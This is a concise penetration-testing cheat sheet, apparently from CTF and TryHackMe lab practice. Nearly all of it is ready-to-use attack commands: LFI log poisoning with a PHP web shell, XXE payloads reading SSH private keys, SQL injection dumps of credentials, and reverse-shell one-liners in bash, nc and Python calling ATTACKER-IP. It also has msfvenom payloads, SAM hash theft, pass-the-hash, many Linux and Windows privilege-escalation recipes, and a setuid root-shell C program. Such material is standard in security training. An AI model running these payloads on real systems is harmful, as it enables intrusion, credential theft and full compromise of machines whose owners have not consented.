# Pentesting (Concise Notes)

|No.|Steps|
|---|---|
|1|[Useful Commands](#useful-commands)|
|2|[Scanning](#scanning)|
|3|[Enumeration](#enumeration)|
|4|[Services](#services)|
|5|[Exploitation](#exploitation)|
|6|[Reverse Shells](#reverse-shells)|
|7|[Bruteforce](#bruteforce)|
|8|[Post-Exploitation](#post-exploitation)|
|9|[Privilege Escalation (Linux)](#linux)|
|10|[Privilege Escalation (Windows)](#windows)|
|11|[Useful Code](#useful-code)|

## Useful Commands

|Purpose|Command|
|---|---|
|Copy file contents to clipboard|`xclip -selection c /usr/share/webshells/php/php-reverse-shell.php`|
|Vim replace all occurrences in the whole file|`:%s/<search_string>/<replace_string>/g`|
|SSH with specified private key|`chmod 400 /home/kali/.ssh/id_rsa` <br>`ssh barry@10.11.67.208 -i /home/kali/.ssh/id_rsa`|
|Find out what shells are present| `cat /etc/shells`|

## Scanning

|No.|Tool|Command|
|---|---|---|
|1|Threader3000|`threader3000 10.11.67.208`|
|2|Autorecon|`autorecon 10.11.67.208`|
|3|Nmap| `nmap -sn 192.168.102.0/24 -T4 -oN discovery.nmap`<br>`nmap -iL output.txt -T4 -sV -sC -p- -Pn -n --open -A -oN version.nmap`<br>`nmap script=vuln 192.168.193.211`

## Enumeration

|No.|Tool|Command|
|---|---|---|
|1|Gobuster| `gobuster dir -u <target site> -w  /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 200 -q` <br> <br> `gobuster dir -x php,txt -u 10.10.119.62 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 200 -q` (To find php files as well as folders)|
|2|Dirsearch| `dirsearch -u 10.10.255.124 -X -x 400,500 -r -f -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt `<br> <br> `dirsearch -u 172.16.64.140/project --auth-type=basic --auth=YWRtaW46YWRtaW4= -X -x 400,500 -r -f -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` (If page needs to login)
|3|Wpscan| `wpscan --url somewebsite.com --enumerate u,ap,at,cb,dbe`|

## Services

|Ports|Services|Tool|Command|
|---|---|---|---|
|21|FTP|nmap <br> ftp (anonymous login) <br> ftp (download all files)|`nmap --script ftp-* -p 21 10.11.67.208` <br> anonymous:anonymous, anonymous:, ftp:ftp <br> `wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98`|
|139, 445|SMB|smbclient (List shares) <br> smbclient (Connect to shares) <br> enum4linux <br> nmap|`smbclient -L //10.130.40.80 -N` <br> `smbclient  //10.10.215.173/milesdyson -U=milesdyson` <br> `enum4linux -a 10.11.67.208` <br> `nmap -script=smb-enum-share`|
|1433/3306| MSSQL, MySQL| sqlitebrowser <br> mysql| `sqlitebrowser user.bak` <br> `mysql -h <ip of sql server> -P <port> -u <username> -p'password' <database name>`|
|3389| RDP| remmina <br> xfreerdp <br> rdesktop| `remmina` <br> `xfreerdp /u:user /p:password321 /v:10.10.202.204` <br> `rdesktop -u admin -p password123 10.10.202.204`|

## Exploitation

|Vulnerability|Signs|Method|Command|
|---|---|---|--|
|Local File Inclusion|files being included in GET parameter| 1. Try to view the server file (view the blacklist) <br> 2. Log poisoning 3. Find Interesting files to read| `/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`<br> <br> <br> <br> <br> User-Agent: `<?php system($_GET['cmd']); ?>` <br> `/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=wget+http%3a//10.11.67.208%3a8023/php-reverse-shell.php` <br><br><br> Use Burpsuite --> Intruder --> wordlist: `/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt`|
|XXE Injection|Add comments fields|1. Test if XML external entity attack is possible <br> 2. Exfiltrate Data in plaintext <br> 3. Exfiltrate data as Base64 encoded strings|`<!DOCTYPE replace [<!ENTITY example "Doe"> ]><userInfo><firstName>John</firstName><lastName>&example;</lastName></userInfo>` --> Returns John Doe if vuln <br> `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/barry/.ssh/id_rsa'>]><comment><com>&test;</com></comment>` <br> `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/home/barry/.ssh/id_rsa'>]><comment><com>&test;</com></comment>`|
|SQL Injection| Login/Register form fields| 1. Find out number of columns present. <br> 2. Determine which cols have string data type. <br> 3. Show the databases <br> 4. Show tables in that DB. <br> 5. Show the columns in that table <br> 6. Dump data from cols.| `' UNION SELECT NULL -- -`, `' UNION SELECT NULL,NULL -- -` … <br> `' UNION SELECT 'a', NULL, NULL -- -`, `' UNION SELECT NULL, 'a', NULL -- -`, `' UNION SELECT NULL, NULL, 'a' -- - ` <br> `' UNION SELECT NULL, NULL, database() -- -` <br> `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'` <br> `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'` <br> `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`|
|Wordpress Rev Shell| Obtained credentials for `/wp-admin` | 1. Go to `Theme Editor` <br> 2. Upload Rev Shell on 404 page. <br> 3. Access it on `/wp-content/themes/twentyseventeen/404.php`| N/A|

## Reverse Shells

Staged payload:
`linux/x64/shell/reverse_tcp`

Unstaged payload:
`linux/x64/shell_reverse_tcp`

Windows:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.67.208 LPORT=53 -f exe -o reverse.exe`

Bash:
* `0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196`
* `mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol`

Python:
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

PHP Webshell:
`<?php system($_GET['cmd']); ?>`

PHP Revshell:
`/usr/share/webshells/php/php-reverse-shell.php`


## Bruteforce

|Tool|Purpose|Usage|
|---|---|---|
|Hashcat|Cracking hashes|1. Identify hashes using `hash-identifier` <br> 2. See example hashes [here](https://hashcat.net/wiki/doku.php?id=example_hashes) <br> 3. `hashcat -m 13100 -a 0 kerberos.hash /usr/share/wordlists/rockyou.txt`|
|John the Ripper|Crack Linux hashes <br> Crack MD5 <br> Crack SSH keys<br> Crack ASC keys <br> Crack specific users| `unshadow /etc/passwd /etc/shadow > crackme` <br> `john crackme --wordlist=rockyou.txt --format=Raw-MD5` <br> `python ssh2john.py id_rsa > id_rsa.hash` <br> `gpg2john tryhackme.asc > hash` <br> `john --wordlist=rockyou.txt -users=victim,victim2 crackme`|
|Wpscan|Bruteforcing `/wp-admin`| `wpscan --url http://test.local/ --passwords passwords.txt`|
|Hydra| Bruteforcing SSH/FTP/SMB <br> Bruteforce Website login <br> Bruteforce Digest Auth <br> Bruteforce Basic Auth| `hydra -t 4 -V -f -l lennie -P /usr/share/wordlists/rockyou.txt 10.10.13.33 ssh/ftp/smb` <br>  `hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L <wordlist of username> -P <wordlist of passwords> -f -V` <br> `hydra -l "carlos" -P /usr/share/wordlists/rockyou.txt www.spiros.ml http-get /auth/digest.php -S` (For HTTP, omit the -S switch) <br> `hydra -l "peter" -P /usr/share/wordlists/rockyou.txt www.spiros.ml http-head /auth/basic.php -S`|
|Stegseek| Bruteforcing password to extract hidden data from files| `stegseek image.jpg`|

## Post-Exploitation

|Purpose|Command|
|---|---|
|OS Architecture| `uname -a` <br> `wmic os get osarchitecture`|
|Stabilize Shell|1. `python3 -c 'import pty;pty.spawn("/bin/bash")'` <br> 2. `export TERM=xterm` <br> 3. `CTRL-Z` <br> 4. `stty raw -echo; fg `|
|Transfer Files| `python -m SimpleHTTPServer 53` <br> `python3 -m http.server 8023` <br> `wget http://<attacker's ip>/<filename>` <br> `curl.exe http://10.11.67.208:8000/output.dll --output output.dll` <br> `powershell -c "Invoke-WebRequest -Uri 'http://10.8.50.72:8000/winPEAS.bat' -OutFile 'C:\Users\bill\Desktop\winpeas.bat'"`|
|Transfer Files (SMB)| `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .` <br> `copy \\10.11.67.208\kali\reverse.exe C:\PrivEsc\reverse.exe`|
|Writable Locations| `/tmp` <br> `C:\\Windows\Tasks ` <br> `C:\\Windows\Temp `|
|Finding flag files| `find / -iname "flag*" 2>/dev/null` <br> 1.` cd /` <br>  2. `dir /s flag.txt` <br> 3.` type C:\Users\thegrinch\Documents\flag.txt`|

## Privilege Escalation

### Linux

|Method|Steps|
|---|---|
|[linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/tag/20220821)| 1. `wget http://10.11.67.208:8023/linpeas.sh` <br> 2. `chmod +x linpeas.sh` <br> 3. `./linpeas.sh` <br> `ssh -p 3306 user@challenge.nahamcon.com < linpeas.sh`|
|[unix-privesc-check](http://pentestmonkey.net/tools/unix-privesc-check)| `./unix-privesc-check standard > output.txt `
|`sudo -l` | `(ALL, !root) NOPASSWD` -->  https://www.exploit-db.com/exploits/47502 <br> `(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py` --> Put library in current directory (`sudo -u rabbit`) to run as rabbit user <br> `(ALL) SETENV: /usr/bin/python3.7 /tmp/hijack.py` --> `sudo PYTHONPATH=/tmp /usr/bin/python3.7 /tmp/hijack.py` `python3 -c 'import sys; print("\n".join(sys.path))'` --> to view the Python Path (look for broken privileges)|
|`sudo sudo -V` (sudo versions: legacy v1.8.2-1.8.31p2 , stable v1.9.0-1.9.5p1)|  `sudoedit -s '\' $(python3 -c 'print("A"*1000)')` --> if `malloc(): memory corruption` means exploitable to [Baron Samedit](https://github.com/blasty/CVE-2021-3156) <br> `cat /etc/*release` <br>`./sudo-hax-me-a-sandwich 0`|
|SUID/SGID bit|`find / -type f -perm -04000 -ls 2>/dev/null` <br> [GTFObins](https://gtfobins.github.io/)|
|Capabilities (more granular privilege management) | `getcap -r / 2>/dev/null` |
|Cron Jobs| `ls -lah /etc/cron*` <br> `cat /etc/crontab` <br> `./pspy64`|
|Unquoted Service Path| `/home/joe/live_logs` --> have SUID bit set <br> `strings /home/joe/live_logs` --> "tail /var/log/nginx/access.log" <br> `echo "/bin/bash" > /tmp/tail` <br> `export PATH=/tmp:$PATH`<br> `echo $PATH` <br> `/home/joe/live_logs` --> to obtain root shell |
|Docker| If `.dockerenv` is present in `/` directory. <br> `docker images` <br> `docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash`|
|`id` (belongs to lxd or lxc group)| 1. Install [System container image builder](https://github.com/lxc/distrobuilder) on attacker<br> 2. `make` <br> 3. `mkdir -p $HOME/ContainerImages/alpine/` <br> 3. `cd $HOME/ContainerImages/alpine/; wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml` <br> 4. `sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8` <br> 5. Upload lxd.tar.xz and rootfs.squashfs to victim <br> 6. `lxc image import lxd.tar.xz rootfs.squashfs --alias alpine` <br> 7. `lxc image list` <br> 8. `lxc init alpine privesc -c security.privileged=true --alias=alpine` <br> 9. `lxc list` <br> 10. `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true` <br> 11. `lxc start privesc` <br> 12. `lxc exec privesc /bin/sh` <br> If `Error: No storage pool found.` --> run `lxd init` and repeat the steps.|
| Network File Sharing | Victim: `cat /etc/exports` (`no_root_squash`) present → create executable with SUID) <br> Attacker: `showmount -e 10.10.44.226` <br> Attacker: `mount -o rw 10.10.44.226:/tmp /home/kali/Documents/tryhackme/linprivesc/tmp` <br> Attacker: Create [nfs](#nfs) <br> Attacker: `gcc nfs.c -o nfs -w` <br> Attacker: `chmod +s nfs` <br> Victim: `cd /tmp; ./nfs`|
|Obtain root outside of container| `chmod +s /bin/bash` <br> `/bin/bash -p`|  


### Windows 

Check privileges:
`whoami /priv`

Service Exploits - Insecure Service Permissions.
Checks the "user" account's permissions on the  "daclsvc" service
1. `C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc` --> "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG)
2. `sc qc daclsvc`
3. `sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""`
4. `net start daclsvc`

Service Exploits - Unquoted Service Path
1. `sc qc unquotedsvc`
2.  `C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`
3. `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
4. `net start unquotedsvc`

Service Exploits - Weak Registry Permissions

1. `sc qc regsvc` --> notes that it runs with SYSTEM privileges (SERVICE_START_NAME)
2. `C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc` --> registry entry for regsvc service is writable by NT AUTHORITY\\INTERACTIVE group (essentially all logged-on users)
3. `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f` --> Overwrite the ImagePath registry key to point to the reverse.exe executable
4. `net start regsvc`

Service Exploits - Insecure service Executables

1. `sc qc filepermsvc` --> it runs with SYSTEM privileges (SERVICE_START_NAME)
2. `C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"` --> Service binary (BINARY_PATH_NAME) file is writable by everyone)
3. `copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`
4. `net start filepermsvc`

Registry - Autoruns

1. `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
2. `C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`
3. `copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y` --> Have to wait for an administrator to login

Registry - AlwaysInstallElevated

1. `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
2. `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` --> Both keys are set to 1 
3. On kali --> `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`
4. `msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

Passwords - Registry

1. `reg query HKLM /f password /t REG_SZ /s`
2. `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"` --> find admin AutoLogon credentials
3. On Kali --> `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

Passwords - Saved Creds

1. `cmdkey /list` --> List any saved creds
2. `runas /savecred /user:admin C:\PrivEsc\reverse.exe`

Passwords - Security Account Manager

1. `copy C:\Windows\Repair\SAM \\10.11.67.208\kali\` --> Transfer the SAM and SYSTEM files to kali thru SMB 
2. `copy C:\Windows\Repair\SYSTEM \\10.11.67.208\kali\` 
3. On kali: `git clone https://github.com/Tib3rius/creddump7;pip3 install pycryptodome`
4. On kali: `python3 creddump7/pwdump.py SYSTEM SAM`
	1. `admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::` --> First hash is LM hash followed by NTLM hash!
5. On kali: `hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`

Passwords - Passing the Hash

`pth-winexe -U 'admin%hash' //10.10.202.204 cmd.exe` --> pass in the full admin hash (includes both LM and NTLM hash, separated by colon)

Scheduled Tasks

1. `type C:\DevTools\CleanUp.ps1` 
2. `C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`
3. `echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`

Insecure GUI Apps

1. `rdesktop -u user -p password321 10.10.201.218` --> login to user account
2. Double-click `AdminPaint` shortcut on Desktop
3. `tasklist /V | findstr mspaint.exe` --> paint is running with admin privileges
4. In Paint, `File` --> `Open`. ` file://c:/windows/system32/cmd.exe`

Startup Apps

1. `C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"` --> BUILTIN\\Users group can write files to the StartUp directory
2. `cscript C:\PrivEsc\CreateShortcut.vbs` -->  create a new shortcut to your reverse.exe executable in the StartUp directory
3. `rdesktop -u admin 10.10.201.218` --> login as admin to simulate an admin login
4. Able to obtain reverse shell

Token Impersonation - [Rogue Potato](https://github.com/antonioCoco/RoguePotato) (Requires SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege)

1. `sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.13.83:9999` --> Forwards Kali port 135 to port 9999 on Windows.
2. `C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`  --> this step is purely to simulate getting a service account shell 
3. `C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse2.exe" -l 999` --> Second reverse shell should have SYSTEM privileges.

Token Impersonation - [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) (From Local/NETWORK SERVICE to system by abusing SeImpersonatePrivilege)

1. `C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe` --> this step is purely to simulate getting a service account shell 
2. `C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`









## Useful Code

### nfs
```c

int main(){
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}

```





